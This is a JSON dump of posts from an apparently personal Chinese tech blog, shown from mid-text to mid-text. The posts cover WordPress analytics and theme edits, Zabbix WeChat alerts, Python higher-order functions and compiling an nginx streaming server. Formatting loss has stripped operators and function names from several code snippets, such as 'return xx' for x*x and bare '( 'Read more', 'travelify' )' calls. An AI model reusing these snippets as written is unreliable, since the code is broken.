x);})();&lt;/script&gt;&lt;noscript&gt;&lt;a href=”http://www3.clustrmaps.com/user/f5e12056d&quot;&gt;&lt;img src=”http://www3.clustrmaps.com/stats/maps-no_clusters/www.cenhq.com-thumb.jpg“ alt=”Locations of visitors to this page” /&gt;&lt;/a&gt;&lt;/noscript&gt;&lt;/div&gt;&lt;/aside&gt;效果显示：","tags":[{"name":"ClustrMaps","slug":"ClustrMaps","permalink":"http://yoursite.com/tags/ClustrMaps/"},{"name":"wordpress","slug":"wordpress","permalink":"http://yoursite.com/tags/wordpress/"}]},{"title":"wordpress添加CNZZ统计","date":"2015-10-16T14:40:00.000Z","path":"2015/10/16/wordpress-add-cnzz/","text":"首先注册cnzz用户，并绑定网站域名获取统计代码，复制代码到主题里的footer.php文件里然后位置显示有问题我想把图标移动到wordpress后面首先注释footer.php里的CNZZ统计代码然后编辑文件library/structure/footer-extensions.php编辑后的内容如下：function travelify_footer_info() { echo ‘&lt;div class=”copyright”&gt;’; echo ( ‘Copyright &amp;copy;’, ‘travelify’ ); echo ‘ ‘.date(‘Y’); echo ‘ ‘.travelify_site_link(); echo ‘. ‘.( ‘Theme by’, ‘travelify’ ); echo ‘ ‘.travelify_colorlib_link( ); echo ‘ ‘.__( ‘Powered by’, ‘travelify’ ); echo ‘ ‘.travelify_wp_link(); echo ‘&lt;div class=”cnzz_tj” style=” display: inline-block; vertical-align: middle; margin-left: 5px; line-height: 13px;“&gt;统计使用：’; echo ‘&lt;script type=”text/javascript”&gt;var cnzz_protocol = ((“https:” == document.location.protocol) ? “ https://“ : “ http://&quot;);document.write(unescape(&quot;%3Cspan id=\\’cnzz_stat_icon_1256550401\\’%3E%3C/span%3E%3Cscript src=\\’” + cnzz_protocol + “s4.cnzz.com/z_stat.php%3Fid%3D1256550401%26show%3Dpic\\’ type=\\’text/javascript\\’%3E%3C/script%3E”));&lt;/script&gt;’; echo ‘&lt;/div&gt;’; echo ‘&lt;/div&gt;&lt;!– .copyright –&gt;’; }保存后刷新页面","tags":[{"name":"wordpress","slug":"wordpress","permalink":"http://yoursite.com/tags/wordpress/"},{"name":"cnzz","slug":"cnzz","permalink":"http://yoursite.com/tags/cnzz/"}]},{"title":"wordpress添加悬浮文章索引","date":"2015-10-15T16:50:35.000Z","path":"2015/10/15/wordpress-add-suspended-the-index/","text":"文章索引相当于文章目录，点击目录自动跳转到相应位置，这就需要你的文章有小标题，像我经常用h3标签来做小标题，这样所有的h3标签就能形成一个索引目录。我们要做的就是把h3标签自动识别出来并组装成一个目录，好了，开始实现方法。 实现方法在文章里必须有h3标签，每一个三级标题都会成为索引中的一项。将下面的代码放到function.php中，就会在你的文章中自动生成一个索引。 修改functions.php文件，添加如下内容： function article_nav($content) { $matches = array(); $ul_li = ''; $r = \"/&lt;h3&gt;(.*?)&lt;\\/h3&gt;/im\"; if (preg_match_all($r, $content, $matches)) { foreach ($matches[1] as $num =&gt; $title) { $content = str_replace($matches[0][$num], '&lt;h2 id=\"article_nav_' . $num . '\"&gt;' . $title . '&lt;/h2&gt;', $content); $ul_li .= '&lt;li&gt;&lt;a href=\"#article_nav_' . $num . '\" title=\"' . $title . '\"&gt;' . $title . \"&lt;/a&gt;&lt;/li&gt;\"; } if (is_singular()) { $content = '&lt;div id=\"fn_article_nav\"&gt;&lt;div id=\"article_nav_title\"&gt;[文章目录]&lt;/div&gt;&lt;ul&gt;' . $ul_li . '&lt;li&gt;&lt;a href=\"#respond\"&gt;发表评论&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;' . $content; } } return $content; } add_filter(\"the_content\", \"article_nav\"); 索引样式索引是生成了，但是只是在文章中的一个普通ul list，我们要做的是把他独立出来，所以只需要为它写一个css样式就好了。推荐用position:fixed把他固定到左边或者右边，下方提供了一个参考样式（见上图），可以根据自己的情况去修改。 修改style.css文件，添加以下内容： /* 文章目录 */ #article_nav_title{font-size:12px;text-align:center;line-height:15px;color:#cc0000;border-left:3px #cc0000 solid;border-bottom:1px #aaa dotted} #fn_article_nav{position:fixed;left:5px;top:140px;background-color:rgba(255,255,255,.55);border-radius: 0 3px 3px 0;box-shadow:0 0 2px #aaa} #fn_article_nav ul{padding:0!important;margin:0px!important} #fn_article_nav li{list-style:none;padding:3px;width:100px;margin:0;background: url(\"images/li.png\") no-repeat scroll 0 5px transparent!important;text-indent: 1.6em;font-size:12px} 查看效果","tags":[{"name":"wordpress","slug":"wordpress","permalink":"http://yoursite.com/tags/wordpress/"}]},{"title":"zabbix使用微信报警","date":"2015-10-15T14:16:14.000Z","path":"2015/10/15/zabbix-add-webchat-alarm/","text":"1.注册微信公众号首先到微信公众平台https://mp.weixin.qq.com申请然后登录，手机客户端扫描二维码，并加关注就可以了然后就可以看到用户数点击用户数，并点击用户，可以看到用户的tofakeid，这个ID就是zabbix将发送报警信息到这个账号。可以在URL里看到这个IDhttps://mp.weixin.qq.com/cgi-bin/singlesendpage?tofakeid=353131080&amp;t=message/send&amp;action=index&amp;token=1007714535&amp;lang=zh_CN### 2.下载微信公众平台私有接口 2.1 进入zabbix报警目录，下载文件[root@monitor ~]# cd /usr/local/share/zabbix/alertscripts [root@monitor alertscripts]# git clone https://github.com/lealife/WeiXin-Private-API Initialized empty Git repository in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/.git/ remote: Counting objects: 172, done. remote: Total 172 (delta 0), reused 0 (delta 0), pack-reused 172 Receiving objects: 100% (172/172), 36.94 KiB, done. Resolving deltas: 100% (72/72), done. 2.2 修改配置文件[root@monitor alertscripts]# vim WeiXin-Private-API/config.php &lt;?php // 全局配置 $G_ROOT = dirname(__FILE__); $G_CONFIG[\"weiXin\"] = array( 'account' =&gt; '微信公众登录账号', 'password' =&gt; '微信公众登录密码', 'cookiePath' =&gt; $G_ROOT. '/cache/cookie', // cookie缓存文件路径 'webTokenPath' =&gt; $G_ROOT. '/cache/webToken', // webToken缓存文件路径 ); [root@monitor alertscripts]# vim WeiXin-Private-API/test.php &lt;?php require \"config.php\"; require \"include/WeiXin.php\"; $weiXin = new WeiXin($G_CONFIG['weiXin']); $testFakeId = \"$argv[1]\"; $msg = \"$argv[3]\"; print_r($weiXin-&gt;send($testFakeId, \"$msg\")); 注意：这里$msg=\"$argv[3]\"表示zabbix传入的第三个参数，因为在zabbix报警时会传入三个参数：一是微信好友ID，二是报警信息的主题，三是报警信息的具体内容，这里跳过了报警信息主题，直接发送报警信息内容 #### 2.3 创建报警脚本 [root@monitor alertscripts]# vim weixin /usr/local/php/bin/php /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/test.php \"$1\" \"$2\" \"$3\" 2.4 修改权限[root@monitor alertscripts]# chown www. weixin WeiXin-Private-API -R [root@monitor alertscripts]# chmod +x weixin 2.5 测试脚本[root@monitor alertscripts]# ./weixin 353131080 \"\" \"hello weixin\" PHP Notice: curl_setopt(): CURLOPT_SSL_VERIFYHOST with value 1 is deprecated and will be removed as of libcurl 7.28.1\\. It is recommended to use value 2 instead in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 32 Notice: curl_setopt(): CURLOPT_SSL_VERIFYHOST with value 1 is deprecated and will be removed as of libcurl 7.28.1\\. It is recommended to use value 2 instead in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 32 PHP Notice: Undefined index: HTTP_USER_AGENT in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 33 Notice: Undefined index: HTTP_USER_AGENT in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 33 PHP Notice: curl_setopt(): CURLOPT_SSL_VERIFYHOST with value 1 is deprecated and will be removed as of libcurl 7.28.1\\. It is recommended to use value 2 instead in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 32 Notice: curl_setopt(): CURLOPT_SSL_VERIFYHOST with value 1 is deprecated and will be removed as of libcurl 7.28.1\\. It is recommended to use value 2 instead in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 32 PHP Notice: Undefined index: HTTP_USER_AGENT in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 33 Notice: Undefined index: HTTP_USER_AGENT in /usr/local/share/zabbix/alertscripts/WeiXin-Private-API/include/LeaWeiXinClient.php on line 33 stdClass Object ( [base_resp] =&gt; stdClass Object ( [ret] =&gt; 0 [err_msg] =&gt; ok ) ) 2.6 查看结果 ### 3.配置zabbix 3.1 创建媒体类型 3.2 填写脚本名称 3.3 编辑用户 3.4 添加weixin脚本 3.5 编辑动作 4.测试报警停掉mongoldb服务","tags":[{"name":"weixin","slug":"weixin","permalink":"http://yoursite.com/tags/weixin/"},{"name":"zabbix","slug":"zabbix","permalink":"http://yoursite.com/tags/zabbix/"}]},{"title":"WP-Postviews使用","date":"2015-10-12T17:59:31.000Z","path":"2015/10/12/wp-postviews-method-of-use/","text":"今天换了个主题，顺便把浏览次数在文章下显示效果弄出来。 首先到插件里下载 然后启用该插件 到设置里找到postviews 1）Count Views From: 设置统计数据来源，可选项：所有人、仅访客、仅注册用户，默认：仅访客。2）Exclude Bot Views: 是否排除搜索机器人（搜索引擎蜘蛛程序）的浏览数量，可选项：是、否，默认：否。3）Views Template: 浏览数统计的显示模板，默认是：%VIEW_COUNT% views ，%VIEW_COUNT%变量表示浏览次数，views是固定显示文本。比如，默认会显示为“3 views”，我们可以更改其显示样式，如果要显示为“热度：3度”，我们可以将其改为“热度：%VIEW_COUNT%度”。4）Most viewed Template: 网站Widget（微件）显示热门文章列表的模板。默认HTML格式是：&lt;li&gt;&lt;a href=”%POST_URL%” title=”%POST_TITLE%”&gt;%POST_TITLE%&lt;/a&gt; - %VIEW_COUNT% views&lt;/li&gt;。其中，%POST_URL%是文章地址，%POST_TITLE%文章标题，%VIEW_COUNT%是浏览次数。我们可以更改成为自己想要的样式，比如个人博客的样式为：&lt;li&gt;&lt;a href=”%POST_URL%”&gt;%POST_TITLE%&lt;/a&gt;&lt;cite&gt;(%VIEW_COUNT%)&lt;/cite&gt;&lt;/li&gt;，完全根据自己需求来设置。5）Display Options: 设置哪些页面可以显示浏览数统计，也可以指定给哪些人显示。其中，页面包括“Home page”主页、“single Posts”文章页、“Pages”页面、“Archive Pages”分类目录归档页、“Search Pages”搜索页、“Other Pages”其它页面，都可以独立配置。另个，每个配置下面都有三个选项可供选择：“Display to everyone”显示给所有人、“Display to registered users only”只显示给注册用户、“Don’t display on archive pages”不显示。6）Uninstall WP-PostViews：WP-Postviews插件卸载。执行卸载后，WordPress Options/PostMetas数据表中的相关插件信息也将删除掉。WP-Postviews插件使用方法：调用日志浏览统计这是WP-Postviews插件的基本使用方法。如果想在你的主题上实现文章点击数，办法很简单，只需要在你的主题模板single.php或loop的相应位置加入以下代码即可：&lt;?php if(function_exists(‘the_views’)) { the_views(); } ?&gt;本人使用该方法：cd /data/www/wwwroot/cenhq/wp-content/themes/travelifyvim library/structure/content-extensions.php#修改一下内容，找到the_posts，在category后面添加代码，我列出的比较多。’…’为省略内容function travelify_theloop_for_archive() { global $post; if( have_posts() ) { while( have_posts() ) { the_post(); do_action( ‘travelify_before_post’ );?&gt;……… &lt;div class=”entry-meta-bar clearfix”&gt; &lt;div class=”entry-meta”&gt; &lt;?php travelify_posted_on(); ?&gt; &lt;?php if( has_category() ) { ?&gt; &lt;span class=”category”&gt;&lt;?php the_category(‘, ‘); ?&gt;&lt;/span&gt; &lt;?php } ?&gt; &lt;?php if ( comments_open() ) { ?&gt; &lt;?php if(function_exists(‘the_views’)) { the_views(); } ?&gt; &lt;span class=”comments”&gt;&lt;?php comments_popup_link( ( ‘No Comments’, ‘travelify’ ), ( ‘1 Comment’, ‘travelify’ ), ( ‘% Comments’, ‘travelify’ ), ‘’, ( ‘Comments Off’, ‘travelify’ ) ); ?&gt;&lt;/span&gt; &lt;?php } ?&gt; &lt;/div&gt;&lt;!– .entry-meta –&gt; &lt;?php echo ‘&lt;a class=”readmore” href=”‘ . get_permalink() . ‘“ title=”‘.the_title( ‘’, ‘’, false ).’”&gt;’.( ‘Read more’, ‘travelify’ ).’&lt;/a&gt;’; ?&gt; &lt;/div&gt;function travelify_theloop_for_single() { global $post; if( have_posts() ) { while( have_posts() ) { the_post(); do_action( ‘travelify_before_post’ );?&gt;……… &lt;div class=”entry-meta-bar clearfix”&gt; &lt;div class=”entry-meta”&gt; &lt;?php travelify_posted_on(); ?&gt; &lt;?php if( has_category() ) { ?&gt; &lt;span class=”category”&gt;&lt;?php the_category(‘, ‘); ?&gt;&lt;/span&gt; &lt;?php } ?&gt; &lt;?php if(function_exists(‘the_views’)) { the_views(); } ?&gt; &lt;?php if ( comments_open() ) { ?&gt; &lt;span class=”comments”&gt;&lt;?php comments_popup_link( ( ‘No Comments’, ‘travelify’ ), ( ‘1 Comment’, ‘travelify’ ), ( ‘% Comments’, ‘travelify’ ), ‘’, __( ‘Comments Off’, ‘travelify’ ) ); ?&gt;&lt;/span&gt; &lt;?php } ?&gt; &lt;/div&gt;&lt;!– .entry-meta –&gt; &lt;/div&gt;第一个函数修改完效果：第二个函数修改完效果：","tags":[{"name":"wordpress","slug":"wordpress","permalink":"http://yoursite.com/tags/wordpress/"},{"name":"WP-PostViews","slug":"WP-PostViews","permalink":"http://yoursite.com/tags/WP-PostViews/"}]},{"title":"python高阶函数","date":"2015-10-10T17:33:39.000Z","path":"2015/10/10/python-higher-order-functions/","text":"十一7天假期，在家休6天。上班来什么都不想做，好无聊。 到今天才想起来学点东西，还是把以前看过的知识再巩固下，顺便记录下来。 本人学python以来，一直断断续续，没人带，自己慢慢摸索。还没入门，好悲剧。 废话不多说，下面是记录的详细内容： 1.把函数作为参数下面简单编写一个高阶函数： def add(x, y, f): return f(x) + f(y) 如果传入abs作为参数f的值： add(10, -8, abs) 根据函数的定义，函数实际执行的代码是： abs(10) + abs(8) 结果：18 由于参数x，y和f都可以任意传入，如果f传入其它函数，可以得出不同的返回值 **任务**：利用add(x, y, f)函数，计算 ![](http://www.cenhq.com/wp-content/uploads/2015/10/1.png) **解答：** import math def add(x, y, f): return f(x) + f(y) print add(25, 9, math.sqrt) 结果：8.0 2.map()函数map()函数是python内置的高阶函数，它接收一个函数f和一个list，并通过把函数f依次作用在list的每个元素上，得出一个新的list并返回例如：list [1, 2, 3, 4, 5, 6, 7, 8, 9]如果希望把list的每个元素都平方，可以用map()函数因此，我们只需要传入函数f(x)=xx,就可以利用map()函数来完成这个计算def f(x): return xxprint map(f,[1, 2, 3, 4, 5, 6, 7, 8, 9])结果：[1, 4, 9, 16, 25, 36, 49, 64, 81]注意：map()不是改变原有的list，而是返回一个新的list。由于list包含的元素可以是任意类型，因此，map()不仅仅可以处理只包含数值的list，事实上它可以处理包含任意类型的list，只要传入的函数f可以处理这些数据类型。任务 ：假设用户输入的英文名不规范，没有按照首字母大写，后续字母小写的规则，请利用map()函数，把一个list（包含若干不规范的英文名字）变成一个包含规范英文名字的list：输入：[‘adam’,’LISA’,’barT’]输出：[‘Adam’,’Lisa’,’Bart’]解答：def s(x): return x[0].upper() + x[1:].lower()print map(s, [‘adam’,’LISA’,’barT’])结果：[‘Adam’,’Lisa’,’Bart’] #### 3.reduce() 函数reduce()函数也是Python内置的一个高阶函数。reduce()函数接收的参数和 map()类似，一个函数 f，一个list，但行为和 map()不同，reduce()传入的函数 f 必须接收两个参数，reduce()对list的每个元素反复调用函数f，并返回最终结果值。例如，编写一个f函数，接收x和y，返回x和y的和：def f(x, y): return x + y调用 reduce(f, [1, 3, 5, 7, 9])时，reduce函数将做如下计算：先计算头两个元素：f(1, 3)，结果为4；再把结果和第3个元素计算：f(4, 5)，结果为9；再把结果和第4个元素计算：f(9, 7)，结果为16；再把结果和第5个元素计算：f(16, 9)，结果为25；由于没有更多的元素了，计算结束，返回结果25。上述计算实际上是对 list 的所有元素求和。虽然Python内置了求和函数sum()，但是，利用reduce()求和也很简单。reduce()还可以接收第3个可选参数，作为计算的初始值。如果把初始值设为100，计算：reduce(f, [1, 3, 5, 7, 9], 100)结果将变为125，因为第一轮计算是：计算初始值和第一个元素：f(100, 1)，结果为101。任务：Python内置了求和函数sum()，但没有求积的函数，请利用recude()来求积：输入：[2, 4, 5, 7, 12]输出：245712的结果解答：def f(x, y): return x yprint reduce(f, [2, 4, 5, 7, 12])结果：3360 #### 4.filter()函数filter()函数是 Python 内置的另一个有用的高阶函数，filter()函数接收一个函数 f 和一个list，这个函数 f 的作用是对每个元素进行判断，返回 True或 False，filter()根据判断结果自动过滤掉不符合条件的元素，返回由符合条件元素组成的新list。例如，要从一个list [1, 4, 6, 7, 9, 12, 17]中删除偶数，保留奇数，首先，要编写一个判断奇数的函数：def is_odd(x): return x % 2 == 1然后，利用filter()过滤掉偶数：filter(is_odd, [1, 4, 6, 7, 9, 12, 17])结果：[1, 7, 9, 17]利用filter()，可以完成很多有用的功能，例如，删除 None 或者空字符串：def is_not_empty(s): return s and len(s.strip()) &gt; 0filter(is_not_empty, [‘test’, None, ‘’, ‘str’, ‘ ‘, ‘END’])结果：[‘test’, ‘str’, ‘END’]注意: s.strip(rm) 删除 s 字符串中开头、结尾处的 rm 序列的字符。当rm为空时，默认删除空白符（包括’\\n’, ‘\\r’, ‘\\t’, ‘ ‘)，如下：a = ‘ 123’a.strip()结果： ‘123’a=’\\t\\t123\\r\\n’a.strip()结果：’123’任务：请利用filter()过滤出1~100中平方根是整数的数，即结果应该是：[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]解答：import mathdef f(x): n = int(math.sqrt(x)) return nn == xprint filter(f, range(1, 101))结果：[1, 4, 9, 16, 25, 36, 49, 64, 81, 100] #### 5.自定义排序函数Python内置的 sorted()函数可对list进行排序：&gt;&gt;&gt;sorted([36, 5, 12, 9, 21])[5, 9, 12, 21, 36]但 sorted()也是一个高阶函数，它可以接收一个比较函数来实现自定义排序，比较函数的定义是，传入两个待比较的元素 x, y，如果 x 应该排在 y 的前面，返回 -1，如果 x 应该排在 y 的后面，返回 1。如果 x 和 y 相等，返回 0。因此，如果我们要实现倒序排序，只需要编写一个reversed_cmp函数：def reversed_cmp(x, y): if x &gt; y: return -1 if x &lt; y: return 1 return 0这样，调用 sorted() 并传入 reversed_cmp 就可以实现倒序排序：&gt;&gt;&gt; sorted([36, 5, 12, 9, 21], reversed_cmp)[36, 21, 12, 9, 5]sorted()也可以对字符串进行排序，字符串默认按照ASCII大小来比较：&gt;&gt;&gt; sorted([‘bob’, ‘about’, ‘Zoo’, ‘Credit’])[‘Credit’, ‘Zoo’, ‘about’, ‘bob’]‘Zoo’排在’about’之前是因为’Z’的ASCII码比’a’小。任务：对字符串排序时，有时候忽略大小写排序更符合习惯。请利用sorted()高阶函数，实现忽略大小写排序的算法。输入：[‘bob’, ‘about’, ‘Zoo’, ‘Credit’]输出：[‘about’, ‘bob’, ‘Credit’, ‘Zoo’]解答：def n(x,y): x = x.lower() y = y.lower() if x &gt; y: return 1 if x &lt; y: return -1 return 0&gt;&gt;&gt; sorted([‘bob’,’about’,’Zoo’,’Credit’], n)[‘about’, ‘bob’, ‘Credit’, ‘Zoo’] #### 6.返回函数Python的函数不但可以返回int、str、list、dict等数据类型，还可以返回函数！例如，定义一个函数 f()，我们让它返回一个函数 g，可以这样写：def f(): print ‘call f()…’ # 定义函数g: def g(): print ‘call g()…’ # 返回函数g: return g仔细观察上面的函数定义，我们在函数 f 内部又定义了一个函数 g。由于函数 g 也是一个对象，函数名 g 就是指向函数 g 的变量，所以，最外层函数 f 可以返回变量 g，也就是函数 g 本身。调用函数 f，我们会得到 f 返回的一个函数：&gt; x = f() # 调用f()call f()…&gt;&gt;&gt; x # 变量x是f()返回的函数：&lt;function g at 0x1037bf320&gt;&gt;&gt;&gt; x() # x指向函数，因此可以调用call g()… # 调用x()就是执行g()函数定义的代码请注意区分返回函数和返回值：def myabs(): return abs # 返回函数def myabs2(x): return abs(x) # 返回函数调用的结果，返回值是一个数值返回函数可以把一些计算延迟执行。例如，如果定义一个普通的求和函数：def calc_sum(lst): return sum(lst)调用calc_sum()函数时，将立刻计算并得到结果：&gt;&gt;&gt; calc_sum([1, 2, 3, 4])10但是，如果返回一个函数，就可以“延迟计算”：def calc_sum(lst): def lazy_sum(): return sum(lst) return lazy_sum调用calc_sum()并没有计算出结果，而是返回函数:&gt;&gt;&gt; f = calc_sum([1, 2, 3, 4])&gt;&gt;&gt; f&lt;function lazy_sum at 0x1037bfaa0&gt;对返回的函数进行调用时，才计算出结果:&gt;&gt;&gt; f()10由于可以返回函数，我们在后续代码里就可以决定到底要不要调用该函数。任务：请编写一个函数calc_prod(lst)，它接收一个list，返回一个函数，返回函数可以计算参数的乘积。def calc_prod(lst): def aa(x,y): return xy def bb(): return reduce(aa,lst) return bb&gt;&gt;&gt; f = calc_prod([1,2,3,4])&gt;&gt;&gt; f()24 #### 7.闭包在函数内部定义的函数和外部定义的函数是一样的，只是他们无法被外部访问：def g(): print ‘g()…’def f(): print ‘f()…’ return g将 g 的定义移入函数 f 内部，防止其他代码调用 g：def f(): print ‘f()…’ def g(): print ‘g()…’ return g但是，考察上一小节定义的 calc_sum 函数：def calc_sum(lst): def lazy_sum(): return sum(lst) return lazy_sum注意: 发现没法把 lazy_sum 移到 calc_sum 的外部，因为它引用了calc_sum 的参数 lst。像这种内层函数引用了外层函数的变量（参数也算变量），然后返回内层函数的情况，称为闭包（Closure）。闭包的特点是返回的函数还引用了外层函数的局部变量，所以，要正确使用闭包，就要确保引用的局部变量在函数返回后不能变。举例如下：# 希望一次返回3个函数，分别计算1x1,2x2,3x3:def count(): fs = [] for i in range(1, 4): def f(): return ii fs.append(f) return fsf1, f2, f3 = count()你可能认为调用f1()，f2()和f3()结果应该是1，4，9，但实际结果全部都是 9（请自己动手验证）。原因就是当count()函数返回了3个函数时，这3个函数所引用的变量 i 的值已经变成了3。由于f1、f2、f3并没有被调用，所以，此时他们并未计算 ii，当 f1 被调用时：&gt;&gt;&gt; f1()9 # 因为f1现在才计算ii，但现在i的值已经变为3因此，返回函数不要引用任何循环变量，或者后续会发生变化的变量。任务：返回闭包不能引用循环变量，请改写count()函数，让它正确返回能计算1x1、2x2、3x3的函数。考察下面的函数 f:def f(j): def g(): return jj return g它可以正确地返回一个闭包g，g所引用的变量j不是循环变量，因此将正常执行。在count函数的循环内部，如果借助f函数，就可以避免引用循环变量i。解答：def count(): fs = [] for i in range(1, 4): def f(j): def g(): return jj return g r = f(i) fs.append(r) return fs&gt;&gt;&gt; f1,f2,f3 = count()&gt;&gt;&gt; print f1(), f2(), f3()1 4 9 #### 8.匿名函数高阶函数可以接收函数做参数，有些时候，我们不需要显式地定义函数，直接传入匿名函数更方便。在Python中，对匿名函数提供了有限支持。还是以map()函数为例，计算 f(x)=x2 时，除了定义一个f(x)的函数外，还可以直接传入匿名函数：&gt;&gt;&gt; map(lambda x: x x, [1, 2, 3, 4, 5, 6, 7, 8, 9])[1, 4, 9, 16, 25, 36, 49, 64, 81]通过对比可以看出，匿名函数 lambda x: x x 实际上就是：def f(x): return x x关键字lambda 表示匿名函数，冒号前面的 x 表示函数参数。匿名函数有个限制，就是只能有一个表达式，不写return，返回值就是该表达式的结果。使用匿名函数，可以不必定义函数名，直接创建一个函数对象，很多时候可以简化代码：&gt;&gt;&gt; sorted([1, 3, 9, 5, 0], lambda x,y: -cmp(x,y))[9, 5, 3, 1, 0]返回函数的时候，也可以返回匿名函数：&gt;&gt;&gt; myabs = lambda x: -x if x &lt; 0 else x&gt;&gt;&gt; myabs(-1)1&gt;&gt;&gt; myabs(1)1任务：利用匿名函数简化以下代码：def is_not_empty(s): return s and len(s.strip()) &gt; 0filter(is_not_empty, [‘test’, None, ‘’, ‘str’, ‘ ‘, ‘END’])*解答：print filter(lambda s:s and len(s.strip()) &gt; 0, [‘test’, None, ‘’, ‘str’, ‘ ‘, ‘END’])[‘test’, ‘str’, ‘END’]","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"基于nginx流媒体服务器搭建","date":"2015-09-21T09:50:00.000Z","path":"2015/09/21/based-on-the-nginx-streaming-media-server/","text":"七牛云存储的流媒体服务，我申请了个测试帐号，在内容管理上传你的视频文件，生成外链。到自己博客里把外链添加到文章里。貌似不能播放。应该是视频格式或者编码问题，问过他们技术，需要转码。但是MPS服务还要认证。然后自己在本地搭建个流媒体服务器。流媒体播放方式：HTTP方式这种方式要下载FLV视频文件到本地播放，一旦FLV视频文件下载完成，就不会消耗服务器的资源和带宽，但是拖动功能没有RTMP/RTMP流媒体方式强大，很多视频网站都是用HTTP方式实现的，如：YouTube，土豆，酷6等RTMP/RTMP流媒体方式这种方式不用下载FLV视频文件到本地，可以实时的播放flv文件，可以任意拖拽播放进度条，但是比较消耗服务器的资源。系统：centos6.5软件：nginx-1.8 1.由于安装时很多依赖包，需要添加源[root@VM-242 src]# cd /usr/local/src [root@VM-242 src]# wget -c http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.3-1.el6.rf.x86_64.rpm [root@VM-242 src]# rpm –import http://apt.sw.be/RPM-GPG-KEY.dag.txt [root@VM-242 src]# rpm -i rpmforge-release-0.5.3-1.el6.rf.*.rpm 2.安装转码工具Mencoder和ffmpeg2.1 安装依赖库[root@VM-242 src]# yum install gcc make automake bzip2 unzip patch subversion libjpeg-devel 2.2 安装yasm[root@VM-242 src]# wget http://www.tortall.net/projects/yasm/releases/yasm-1.2.0.tar.gz [root@VM-242 src]# tar zxvf yasm-1.2.0.tar.gz [root@VM-242 src]# cd yasm-1.2.0 [root@VM-242 yasm-1.2.0]# ./configure [root@VM-242 yasm-1.2.0]# make &amp;&amp; make install [root@VM-242 yasm-1.2.0]# cd .. 2.3 卸载系统原有的ffmpeg和x264[root@VM-242 src]# yum remove ffmpeg x264 2.4 安装Mplayer编码库[root@VM-242 src]# wget -c http://www2.mplayerhq.hu/MPlayer/releases/codecs/essential-amd64-20071007.tar.bz2 [root@VM-242 src]# tar xf essential-amd64-20071007.tar.bz2 [root@VM-242 src]# mkdir /usr/local/lib/codecs [root@VM-242 src]# cp -Rvp essential-amd64-20071007/* /usr/local/bin/codecs/ [root@VM-242 src]# vim /etc/ld.so.conf /usr/lib /usr/local/lib 2.5 加载动态库[root@VM-242 src]# ldconfig 2.6 安装一些格式转换常用的编码库[root@VM-242 src]# yum install faac-devel lame-devel amrnb-devel opencore-amr-devel amrwb-devel libvorbis-devel libtheora-devel xvidcore-devel 2.7 安装x.264[root@VM-242 src]# wget ftp://ftp.videolan.org/pub/videolan/x264/snapshots/last_stable_x264.tar.bz2 [root@VM-242 src]# tar xvjf last_stable_x264.tar.bz2 [root@VM-242 src]# cd x264-snapshot-20150920-2245-stable/ [root@VM-242 x264-snapshot-20150920-2245-stable]# ./configure –enable-shared –enable-pic [root@VM-242 x264-snapshot-20150920-2245-stable]# make &amp;&amp; make install [root@VM-242 x264-snapshot-20150920-2245-stable]# cd .. 2.8 安装libvpx[root@VM-242 src]# wget http://webm.googlecode.com/files/libvpx-v1.2.0.tar.bz2 [root@VM-242 src]# tar xf libvpx-v1.2.0.tar.bz2 [root@VM-242 src]# cd libvpx-v1.2.0 [root@VM-242 libvpx-v1.2.0]# ./configure --enable-shared --enable-pic [root@VM-242 libvpx-v1.2.0]# make &amp;&amp; make install [root@VM-242 libvpx-v1.2.0]# cd .. 2.9 安装ffmpeg[root@VM-242 src]# wget http://ffmpeg.org/releases/ffmpeg-2.0.1.tar.bz2 [root@VM-242 src]# tar xf ffmpeg-2.0.1.tar.bz2 [root@VM-242 src]# cd ffmpeg-2.0.1 [root@VM-242 ffmpeg-2.0.1]# ./configure --enable-gpl --enable-version3 --enable-shared --enable-nonfree --enable-postproc --enable-libfaac --enable-libmp3lame --enable-libopencore-amrnb --enable-libop --encore-amrwb --enable-libtheora --enable-libvorbis --enable-libvpx --enable-libx264 --enable-libxvid [root@VM-242 ffmpeg-2.0.1]# make &amp;&amp; make install [root@VM-242 ffmpeg-2.0.1]# cd .. 2.10 安装mencoder[root@VM-242 src]# yum install mplayer mencoder flvtool2 2.11 查看已经安装好的视频和视频编码器查看支持的音频编码 [root@VM-242 src]# mencoder -oac help 查看支持的视频编码 [root@VM-242 src]# mencoder -ovc help 可参考：http://www.mplayerhq.hu/DOCS/HTML/zh_CN/menc-feat-selecting-codec.html 3.安装nginx3.1首先安装依赖库pcre[root@VM-242 src]# wget http://sourceforge.net/projects/pcre/files/pcre/8.37/pcre-8.37.tar.gz [root@VM-242 src]# tar xf pcre-8.37.tar.gz 3.2 安装yamdi用来为flv创建关键帧才能随意拖动[root@VM-242 src]# yum install gcc gcc-c++ openssl-devel zlib-devel yamdi 3.3 下载所需的nginx模块3.3.1 第一个是nginx_mod_h264_streaming,让nginx支持flv/mp4流播放 [root@VM-242 src]# wget http://h264.code-shop.com/download/nginx_mod_h264_streaming-2.2.7.tar.gz [root@VM-242 src]# tar xf nginx_mod_h264_streaming-2.2.7.tar.gz 注意：先要修改一下这家伙的源码，注释掉nginx_mod_h264_streaming-2.2.7/src/ngx_http_streaming_module.c的158到161行 /* TODO: Win32 */ //if (r-&gt;zero_in_uri) // { // return NGX_DECLINED; // } 3.3.2 第二个是nginx-rtmp-module，让nginx支持rtmp/hls协议[root@VM-242 src]# wget -O nginx-rtmp-module.zip https://github.com/arut/nginx-rtmp-module/archive/master.zip [root@VM-242 src]# unzip nginx-rtmp-module.zip 3.3.3 下载清缓存的模块[root@VM-242 src]# wget -O ngx_cache_purge.zip https://github.com/FRiCKLE/ngx_cache_purge/archive/master.zip [root@VM-242 src]# unzip 